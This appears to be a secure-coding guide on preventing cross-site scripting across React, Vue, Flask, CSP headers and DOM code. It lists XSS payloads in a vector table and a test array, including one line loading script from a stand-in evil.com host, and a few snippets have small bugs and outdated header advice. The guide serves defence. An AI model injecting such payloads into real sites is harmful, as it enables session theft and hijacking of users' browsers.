# XSS (Cross-Site Scripting) Prevention

Comprehensive guide to preventing XSS attacks in web applications across different contexts and frameworks.

## XSS Attack Types

xss_types[3]{type,description,example}:
Reflected XSS,User input immediately returned in response,Search query displayed on page
Stored XSS,Malicious script stored in database,Comment field with script tag
DOM-based XSS,Client-side JavaScript manipulates DOM unsafely,innerHTML with user data

## XSS Attack Vectors

xss_vectors[10]{vector,payload,context}:
Script Tag,<script>alert('XSS')</script>,HTML context
Event Handler,<img src=x onerror=alert('XSS')>,HTML attribute
JavaScript URL,<a href="javascript:alert('XSS')">click</a>,URL context
Style Injection,<style>body{background:url('javascript:alert(1)')}</style>,CSS context
SVG Script,<svg onload=alert('XSS')>,HTML/SVG context
Form Action,<form action="javascript:alert('XSS')"><input type=submit>,HTML form
Meta Refresh,<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">,HTML meta tag
Object/Embed,<object data="javascript:alert('XSS')">,HTML object
Iframe Injection,<iframe src="javascript:alert('XSS')">,HTML iframe
Data URI,<img src="data:text/html,<script>alert('XSS')</script>">,Data URI context

## 1. React/JSX - Built-in Protection

React automatically escapes content, providing XSS protection by default.

**TypeScript/React**:
```typescript
import React from 'react';
import DOMPurify from 'dompurify';

interface UserProfileProps {
  username: string;
  bio: string;
  website: string;
}

function UserProfile({ username, bio, website }: UserProfileProps) {
  // ✅ SAFE - React automatically escapes
  return (
    <div>
      <h1>{username}</h1>
      <p>{bio}</p>
      <a href={website}>Website</a>
    </div>
  );

  // If user enters: <script>alert('XSS')</script>
  // React renders: &lt;script&gt;alert('XSS')&lt;/script&gt;
}

// ❌ DANGEROUS - Using dangerouslySetInnerHTML
function UnsafeComponent({ htmlContent }: { htmlContent: string }) {
  return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}

// ✅ SAFE - Sanitize before using dangerouslySetInnerHTML
function SafeHTMLComponent({ htmlContent }: { htmlContent: string }) {
  const sanitizedHTML = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [],
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />;
}

// ✅ SAFE - URL sanitization
function SafeLink({ url, text }: { url: string; text: string }) {
  // Whitelist allowed protocols
  const isValidURL = (url: string): boolean => {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  };

  const safeURL = isValidURL(url) ? url : '#';

  return <a href={safeURL}>{text}</a>;
}

// ✅ SAFE - Markdown rendering with sanitization
import ReactMarkdown from 'react-markdown';

function SafeMarkdown({ content }: { content: string }) {
  return (
    <ReactMarkdown
      components={{
        // Disable potentially dangerous elements
        script: () => null,
        iframe: () => null,
        object: () => null,
        embed: () => null,
      }}
      disallowedElements={['script', 'iframe', 'object', 'embed']}
    >
      {content}
    </ReactMarkdown>
  );
}

// ✅ SAFE - Form input handling
function CommentForm() {
  const [comment, setComment] = React.useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // React state is safe from XSS
    // Server-side validation still required
    await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ comment }),
    });

    setComment('');
  };

  return (
    <form onSubmit={handleSubmit}>
      {/* ✅ SAFE - React handles value escaping */}
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        placeholder="Enter comment"
      />
      <button type="submit">Submit</button>
    </form>
  );
}
```

## 2. Vue.js - Template Protection

Vue.js automatically escapes content in templates.

**TypeScript/Vue**:
```vue
<template>
  <div>
    <!-- ✅ SAFE - Vue automatically escapes -->
    <h1>{{ username }}</h1>
    <p>{{ userBio }}</p>

    <!-- ❌ DANGEROUS - v-html renders raw HTML -->
    <div v-html="dangerousContent"></div>

    <!-- ✅ SAFE - Sanitize before v-html -->
    <div v-html="sanitizedContent"></div>

    <!-- ✅ SAFE - Bind attributes safely -->
    <a :href="safeUrl">{{ linkText }}</a>

    <!-- ✅ SAFE - Form handling -->
    <form @submit.prevent="handleSubmit">
      <textarea v-model="comment" placeholder="Comment"></textarea>
      <button type="submit">Submit</button>
    </form>
  </div>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue';
import DOMPurify from 'dompurify';

const username = ref('');
const userBio = ref('');
const dangerousContent = ref('');
const comment = ref('');

// ✅ Sanitize HTML content
const sanitizedContent = computed(() => {
  return DOMPurify.sanitize(dangerousContent.value, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [],
  });
});

// ✅ Validate URLs
const isValidURL = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};

const safeUrl = computed(() => {
  return isValidURL(linkUrl.value) ? linkUrl.value : '#';
});

const handleSubmit = async () => {
  // Vue v-model is safe from XSS
  await fetch('/api/comments', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ comment: comment.value }),
  });
  comment.value = '';
};
</script>
```

## 3. Python/Jinja2 Templates

**Python/Flask**:
```python
from flask import Flask, render_template_string, Markup
from markupsafe import escape
import bleach

app = Flask(__name__)

# ✅ SAFE - Jinja2 auto-escapes by default
@app.route('/user/<username>')
def user_profile(username):
    # Jinja2 automatically escapes {{ username }}
    return render_template_string('''
        <h1>User: {{ username }}</h1>
        <p>Welcome!</p>
    ''', username=username)

# ❌ DANGEROUS - Marking as safe without sanitization
@app.route('/unsafe/<content>')
def unsafe_route(content):
    # DON'T DO THIS - bypasses escaping
    return render_template_string('''
        <div>{{ content|safe }}</div>
    ''', content=content)

# ✅ SAFE - Sanitize before marking safe
@app.route('/safe/<content>')
def safe_route(content):
    # Sanitize HTML with bleach
    sanitized = bleach.clean(
        content,
        tags=['b', 'i', 'em', 'strong', 'p', 'br'],
        attributes={},
        strip=True
    )
    return render_template_string('''
        <div>{{ content|safe }}</div>
    ''', content=sanitized)

# ✅ SAFE - Manual escaping when needed
from markupsafe import escape as jinja_escape

@app.route('/comment')
def display_comment():
    user_comment = request.args.get('comment', '')

    # Manually escape if not using template
    escaped_comment = jinja_escape(user_comment)

    return f'<div>Comment: {escaped_comment}</div>'

# ✅ SAFE - URL sanitization
from urllib.parse import urlparse

def is_safe_url(url: str) -> bool:
    """Validate URL is safe"""
    try:
        parsed = urlparse(url)
        return parsed.scheme in ('http', 'https', 'mailto')
    except:
        return False

@app.route('/link')
def external_link():
    url = request.args.get('url', '')
    safe_url = url if is_safe_url(url) else '#'

    return render_template_string('''
        <a href="{{ url }}">Click here</a>
    ''', url=safe_url)
```

## 4. Content Security Policy (CSP)

CSP is a powerful defense-in-depth mechanism against XSS.

**Python/FastAPI with CSP Headers**:
```python
from fastapi import FastAPI
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from fastapi.responses import HTMLResponse
import secrets

app = FastAPI()

# Generate nonce for inline scripts
def generate_nonce() -> str:
    return secrets.token_urlsafe(16)

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)

    # Generate nonce for this request
    nonce = generate_nonce()

    # Strict CSP policy
    csp_policy = (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'"
    )

    response.headers['Content-Security-Policy'] = csp_policy
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

    # Store nonce for template use
    request.state.csp_nonce = nonce

    return response

@app.get("/", response_class=HTMLResponse)
async def index(request):
    nonce = request.state.csp_nonce

    # ✅ SAFE - Inline script with nonce
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Page</title>
    </head>
    <body>
        <h1>Welcome</h1>
        <script nonce="{nonce}">
            console.log('This script is allowed by CSP');
        </script>
    </body>
    </html>
    '''
    return html
```

**TypeScript/Express with CSP**:
```typescript
import express from 'express';
import helmet from 'helmet';
import crypto from 'crypto';

const app = express();

// ✅ Use helmet for security headers including CSP
app.use((req, res, next) => {
  // Generate nonce for inline scripts
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req, res) => `'nonce-${res.locals.cspNonce}'`,
        ],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
    xssFilter: true,
    noSniff: true,
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  })
);

app.get('/', (req, res) => {
  const nonce = res.locals.cspNonce;

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Secure Page</title>
    </head>
    <body>
      <h1>Welcome</h1>
      <script nonce="${nonce}">
        console.log('This script is allowed');
      </script>
    </body>
    </html>
  `);
});
```

## 5. DOM-based XSS Prevention

**JavaScript/TypeScript**:
```typescript
// ❌ DANGEROUS - Direct DOM manipulation with user input
function displayMessageUnsafe(message: string) {
  document.getElementById('output').innerHTML = message;
}

// ✅ SAFE - Use textContent instead
function displayMessageSafe(message: string) {
  const element = document.getElementById('output');
  if (element) {
    element.textContent = message; // Automatically escapes
  }
}

// ❌ DANGEROUS - eval with user input
function executeCodeUnsafe(code: string) {
  eval(code); // NEVER DO THIS
}

// ❌ DANGEROUS - Function constructor
function createFunctionUnsafe(code: string) {
  return new Function(code); // NEVER DO THIS
}

// ✅ SAFE - Create DOM elements programmatically
function createLinkSafe(url: string, text: string): HTMLAnchorElement {
  const link = document.createElement('a');
  link.textContent = text; // Safe from XSS
  link.href = sanitizeURL(url);
  return link;
}

function sanitizeURL(url: string): string {
  try {
    const parsed = new URL(url);
    if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return url;
    }
  } catch {
    // Invalid URL
  }
  return '#'; // Safe fallback
}

// ✅ SAFE - URL parameter handling
function getQueryParamSafe(param: string): string {
  const urlParams = new URLSearchParams(window.location.search);
  const value = urlParams.get(param);

  // Display safely
  const element = document.getElementById('output');
  if (element && value) {
    element.textContent = value; // Safe
  }

  return value || '';
}

// ❌ DANGEROUS - Direct location manipulation
function redirectUnsafe(url: string) {
  window.location = url; // Can be javascript: URL
}

// ✅ SAFE - Validate before redirect
function redirectSafe(url: string) {
  if (sanitizeURL(url) !== '#') {
    window.location.href = url;
  }
}

// ✅ SAFE - Using DOMPurify for rich content
import DOMPurify from 'dompurify';

function displayRichContentSafe(html: string) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_URI_REGEXP: /^https?:\/\//,
  });

  const element = document.getElementById('output');
  if (element) {
    element.innerHTML = sanitized;
  }
}
```

## XSS Prevention Checklist

xss_prevention_checklist[15]{technique,context,implementation}:
Auto-escaping Templates,HTML context,Use React Vue Jinja2 with default escaping
Output Encoding,All contexts,Encode based on context HTML JS URL CSS
Input Validation,All inputs,Validate and sanitize user inputs
Content Security Policy,HTTP headers,Implement strict CSP with nonces
DOMPurify,Rich HTML content,Sanitize before innerHTML or v-html
textContent over innerHTML,DOM manipulation,Use textContent for plain text
URL Validation,Links and redirects,Whitelist protocols validate domains
Avoid eval,JavaScript execution,Never use eval or Function constructor
HTTPOnly Cookies,Session cookies,Prevent JavaScript access to cookies
X-XSS-Protection Header,Legacy browsers,Enable XSS filter mode=block
X-Content-Type-Options,MIME sniffing,Set to nosniff
Sanitize JSON,API responses,Ensure JSON cannot break out of context
Template Engine Security,Server-side rendering,Use auto-escaping engines
Framework Security Features,All frameworks,Leverage built-in XSS protection
Security Testing,Development process,Test for XSS with automated tools

## Context-Specific Encoding

encoding_contexts[6]{context,encoding_function,example}:
HTML Content,HTML entity encoding,&lt;script&gt; becomes &amp;lt;script&amp;gt;
HTML Attribute,HTML attribute encoding,Encode quotes and special chars
JavaScript String,JavaScript escaping,Escape quotes backslashes
URL Parameter,URL encoding,Use encodeURIComponent
CSS Value,CSS escaping,Escape special CSS characters
JSON,JSON encoding,Use JSON.stringify never concatenate

## Testing for XSS

**Test payloads**:

```typescript
const xssTestPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg/onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "'><script>alert('XSS')</script>",
  '<script src="http://evil.com/xss.js"></script>',
  '<object data="javascript:alert(\'XSS\')">',
];

// Test each payload
xssTestPayloads.forEach((payload) => {
  const sanitized = DOMPurify.sanitize(payload);
  console.assert(
    !sanitized.includes('<script'),
    `XSS payload not sanitized: ${payload}`
  );
});
```

---

**Remember**: Never trust user input. Always escape output based on context. Use framework protections and CSP headers.
